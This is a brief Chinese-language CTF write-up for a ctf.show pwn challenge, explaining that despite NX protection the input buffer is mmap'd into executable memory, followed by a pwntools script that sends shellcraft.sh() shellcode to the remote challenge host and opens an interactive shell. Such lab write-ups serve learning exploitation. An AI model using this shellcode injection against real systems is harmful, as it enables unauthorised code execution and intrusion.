# 挑战简介
有时候开启某种保护并不代表这条路不通

# 思路
开了nx保护，说明你输入的内存区域不可执行

但是，这一题，buf被mmap映射到了一个可执行区域  

也就是说，你输入的shellcode被保存在buf内，从而将此处的内存地址映射到了一个可执行的区域，你的shellcode因此便可执行了  

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='i386', log_level='debug')

p = remote("pwn.challenge.ctf.show",28123)
elf = ELF('D:\edge 下载\pwn')

shellcode = asm(shellcraft.sh())

#p.recvuntil("")

payload = shellcode

p.sendline(payload)

p.interactive()

```
